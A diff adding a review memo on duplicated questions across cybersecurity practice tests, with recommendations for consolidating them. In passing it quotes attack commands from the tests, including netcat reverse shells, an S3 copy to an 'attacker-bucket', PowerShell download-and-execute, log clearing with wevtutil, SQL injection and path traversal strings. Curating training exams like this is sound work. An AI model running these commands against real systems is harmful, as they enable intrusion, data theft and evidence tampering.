@@ -1,1 +1,85 @@
 
+1. Credential Stuffing / Failed Login Patterns
+Topics Duplicated:
+Multiple tests include questions describing repeated failed login attempts (often from different IPs) followed by a successful login using a privileged account.
+Observation:
+Several items (e.g., in Test #10 and others) ask which attack is being performed and the answer is “credential stuffing.”
+Recommendation:
+Consider consolidating these into one unique scenario per test or varying the details (e.g., changing usernames, IP patterns, or the context) so that each question adds a new angle.
+2. Active Directory Enumeration & BloodHound
+Topics Duplicated:
+Questions that use the bloodhound-python command (or similar AD enumeration techniques) to map Active Directory relationships for privilege escalation.
+Questions using nltest /dclist:corp.local to enumerate domain controllers.
+Questions regarding the use of dcsync to extract NTLM hashes.
+Observation:
+These items appear in several tests (e.g., Test #9, Test #10, etc.), sometimes with only minor differences.
+Recommendation:
+Vary the scenarios (for example, include one on Kerberoasting vs. one on general AD reconnaissance) to reduce repetition.
+3. Netcat Reverse Shells
+Topics Duplicated:
+Several questions use Netcat commands with -e /bin/bash (or variants with nohup) to establish a reverse shell.
+Examples include commands like:
+nc -e /bin/bash …
+nohup nc -e /bin/bash … &
+Observation:
+These appear in multiple tests as separate questions.
+Recommendation:
+If the goal is to test recognition of reverse shell patterns, consider keeping one representative question per test instead of multiple similar ones.
+4. Hashcat Usage
+Topics Duplicated:
+Questions that ask about using Hashcat with various modes:
+-m 1000 (for NTLM)
+-m 22000 (for WPA2 handshakes)
+-m 18200 (for KeePass vaults)
+-m 13100 (for Kerberos AS-REP hashes)
+Observation:
+While the modes are different, the structure of the questions is similar.
+Recommendation:
+Ensure each question clearly states its context so that test-takers must distinguish between hash types. If too many questions cover similar ground, consider reducing or diversifying the topics further.
+5. AWS / Cloud Security Items
+Topics Duplicated:
+Several questions cover:
+Exfiltration from S3 buckets (e.g., aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive)
+Accessing cloud instance metadata (169.254.169.254 queries)
+Enumerating EC2 instances via AWS CLI commands.
+Observation:
+These cloud-related scenarios are repeated in multiple tests.
+Recommendation:
+Either combine them into one multi-part question or adjust the scenarios so that each one tests a slightly different aspect of cloud security.
+6. SQL Injection
+Topics Duplicated:
+At least one question (and possibly more) describes an SQL injection payload that uses the classic ' OR '1'='1'-- pattern to bypass authentication.
+Observation:
+This is a well-known scenario and appears in more than one test.
+Recommendation:
+Consider varying the injection scenario (e.g., by changing context or payload details) or ensuring that only one representative question per test is used.
+7. Responder / Null Session / SMB Enumeration
+Topics Duplicated:
+Multiple tests include questions about using tools such as Responder (e.g., responder -I eth0) for capturing credentials.
+Observation:
+If you have several similar questions about SMB enumeration or credential capture via Responder, try to consolidate them.
+Recommendation:
+Vary the technical details (e.g., different aspects of SMB or different tools) to avoid repetition.
+8. Clearing Logs / Wevtutil
+Topics Duplicated:
+Questions using the wevtutil cl Security command to clear Windows event logs.
+Observation:
+This scenario appears repeatedly across tests.
+Recommendation:
+Use a single, well-crafted question to cover this topic unless additional nuance (e.g., different contexts) is added.
+9. Fileless / PowerShell Execution
+Topics Duplicated:
+Several questions describe the use of PowerShell with the -ep bypass and -enc flags to execute remote scripts or payloads (e.g., using IEX(New-Object Net.WebClient).DownloadString(...)).
+Observation:
+These are common in multiple tests.
+Recommendation:
+If many tests have similar PowerShell-based questions, consider combining or varying the parameters to ensure each question is unique.
+10. Miscellaneous Repeated Themes
+Directory Traversal:
+Questions about using URL parameters (e.g., ../../../../etc/passwd) appear more than once.
+SUID / Linux Privilege Escalation:
+The find / -perm -4000 command is used in multiple tests.
+Firewall Rule Changes:
+Several questions involve modifying firewall rules using iptables or similar.
+Registry Modifications on Windows:
+Questions about adding registry keys for persistence are repeated.
